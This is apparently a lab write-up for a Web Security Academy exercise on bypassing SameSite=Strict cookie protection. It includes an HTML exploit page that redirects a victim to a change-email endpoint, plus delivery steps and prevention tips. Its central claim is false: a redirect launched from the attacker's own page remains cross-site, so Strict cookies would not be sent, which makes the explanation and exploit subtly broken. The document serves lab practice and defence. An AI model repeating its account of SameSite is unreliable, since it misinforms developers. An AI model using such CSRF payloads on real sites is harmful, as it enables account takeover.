# Lab: SameSite Strict bypass via client-side redirect

**Difficulty:** Practitioner  
**Category:** Cross-Site Request Forgery (CSRF) / SameSite Cookies

## 🎯 Objective
Bypass `SameSite=Strict` cookie protection using a client-side redirect.

## 📖 Description
The session cookie is set with `SameSite=Strict`. This is the strongest protection and blocks **all** cross-site requests. However, a client-side redirect (e.g. via JavaScript or meta refresh) can make the final request appear as a top-level navigation, bypassing the restriction.

## 🔍 Vulnerability Analysis

- **Cookie Attribute**: `SameSite=Strict`
- **Strict Behavior**: Blocks cross-site requests completely.
- **Bypass Technique**: Perform a client-side redirect so the request is treated as a top-level same-site request.

## 🛠️ How to Solve (Step by Step)

1. Confirm the session cookie has `SameSite=Strict`.
2. Normal CSRF exploit (form POST) will fail.
3. Create an exploit page that first redirects the victim (client-side) to the target domain.
4. The redirect makes the subsequent request bypass Strict policy.

## 💥 Exploit Code

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>SameSite Strict Bypass - Client Redirect</title>
</head>
<body>
    <h1>Redirecting...</h1>

    <!-- Method 1: Meta Refresh -->
    <meta http-equiv="refresh" content="0; url=https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=hacker@evil.com">

    <!-- OR Method 2: JavaScript Redirect -->
    <script>
        // You may need to chain redirects or use window.location
        window.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=hacker@evil.com";
    </script>
</body>
</html>
```
🚀 Delivery
Upload the HTML to Exploit Server → Deliver to victim.
⚡ Impact
Even SameSite=Strict can be bypassed if the application allows client-side navigation that triggers the action.
🛡️ Prevention

Avoid relying only on SameSite cookies.
Always use proper CSRF tokens bound to the session.
Be careful with open redirects and client-side navigation on sensitive actions.

🔬 Key Learning Points

SameSite=Strict is strong but not perfect against all client-side techniques.
Top-level navigations (redirects) can bypass Strict policy.
Defense in depth is important (SameSite + CSRF tokens).
